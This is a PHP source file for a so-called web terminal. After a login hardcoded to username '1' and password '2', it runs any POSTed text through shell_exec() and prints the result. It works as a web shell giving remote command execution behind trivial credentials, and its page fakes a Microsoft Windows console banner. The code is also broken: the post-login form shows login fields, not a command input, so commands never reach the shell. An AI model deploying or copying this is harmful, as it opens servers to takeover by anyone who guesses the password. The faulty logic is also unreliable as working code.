<?php
// index.php — Windows-style web terminal with login (no JS, no graphics)

// Temporary login credentials
$valid_user = "1";
$valid_pass = "2";

// Session to track login state
session_start();

// Build a Windows-like prompt: C:\Users\username>
$prompt_user = get_current_user();
$prompt_path = 'C:\\Users\\' . $prompt_user;

// Last command and its output
$command = '';
$output = '';

/* ---------------- LOGIN LOGIC ---------------- */

if (!isset($_SESSION['logged_in'])) {
    $_SESSION['logged_in'] = false;
}

$login_message = "";
$show_login = !$_SESSION['logged_in'];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // LOGIN PHASE
    if (!$show_login && isset($_POST['command'])) {
        // Already logged in → process terminal command
        $command = trim($_POST['command']);
        if ($command !== '') {
            $output = shell_exec($command . ' 2>&1');
        }
    }

    if ($show_login && isset($_POST['username']) && isset($_POST['password'])) {

        $u = trim($_POST['username']);
        $p = trim($_POST['password']);

        // Simulate asterisk output AFTER pressing Enter
        $masked = str_repeat("*", strlen($p));

        if ($u === $valid_user && $p === $valid_pass) {
            $_SESSION['logged_in'] = true;
            $show_login = false;
            $login_message = "WELCOME\n";
        } else {
            $login_message = "Username: " . htmlspecialchars($u) . "\n";
            $login_message .= "Password: " . $masked . "\n";
            $login_message .= "WRONG\n\n";
        }
    }
}

/* ---------------- PREPARE TERMINAL OUTPUT ---------------- */

$prompt_label_html = htmlspecialchars($prompt_path . '>', ENT_QUOTES, 'UTF-8');

$last_command_line_html = "";
if ($command !== '') {
    $last_command_line_html = htmlspecialchars($prompt_path . '> ' . $command, ENT_QUOTES, 'UTF-8');
}

$output_html = "";
if ($command !== '') {
    if ($output === null) {
        $output_html = "(command failed or returned no output)";
    } elseif ($output === '') {
        $output_html = "(no output)";
    } else {
        $output_html = nl2br(htmlspecialchars($output, ENT_QUOTES, 'UTF-8'));
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>PHP Windows-like Terminal</title>
<style>
    html, body {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #000;
        color: #FFF;
        font-family: Consolas, "Courier New", monospace;
    }

    .terminal {
        box-sizing: border-box;
        padding: 10px;
        height: 100%;
        width: 100%;
        overflow-y: auto;
        white-space: pre-wrap;
        font-size: 14px;
        line-height: 1.3;
    }

    .line {
        margin: 0;
        padding: 0;
    }

    .prompt-line {
        display: flex;
        align-items: center;
        margin: 0;
        padding: 0;
        white-space: nowrap;
    }

    .prompt-label {
        white-space: nowrap;
        margin-right: 1ch;
    }

    .prompt-input {
        flex: 1;
    }

    input[type="text"], input[type="password"] {
        width: 100%;
        background: transparent;
        border: none;
        color: #FFF;
        font: inherit;
        outline: none;
        caret-color: #FFF;
    }

    .hidden-submit {
        display: none;
    }
</style>
</head>
<body>
<div class="terminal">

<?php if ($show_login): ?>

    <div class="line">LOGIN REQUIRED</div>
    <div class="line"></div>

    <?php if ($login_message !== ""): ?>
        <div class="line"><?php echo nl2br(htmlspecialchars($login_message)); ?></div>
    <?php endif; ?>

    <form method="post" autocomplete="off">
        <div class="line">Username:</div>
        <input type="text" name="username" autofocus>

        <div class="line">Password:</div>
        <input type="password" name="password">

        <button type="submit" class="hidden-submit">Login</button>
    </form>

<?php else: ?>

    <div class="line">Microsoft Windows [Version 10.0.19045.0000]</div>
    <div class="line">(c) Microsoft Corporation. All rights reserved.</div>
    <div class="line"></div>

    <?php if ($login_message !== ""): ?>
        <div class="line"><?php echo nl2br(htmlspecialchars($login_message)); ?></div>
    <?php endif; ?>

    <?php if ($command !== ''): ?>
        <div class="line"><?php echo $last_command_line_html; ?></div>
        <div class="line"><?php echo $output_html; ?></div>
    <?php endif; ?>

<form method="post" autocomplete="off">

    <div class="prompt-line">
        <span class="prompt-label">Username:</span>
        <div class="prompt-input">
            <input type="text" name="username" autofocus>
        </div>
    </div>

    <div class="prompt-line">
        <span class="prompt-label">Password:</span>
        <div class="prompt-input">
            <input type="password" name="password">
        </div>
    </div>

    <button type="submit" class="hidden-submit">Login</button>
</form>


<?php endif; ?>

</div>
</body>
</html>
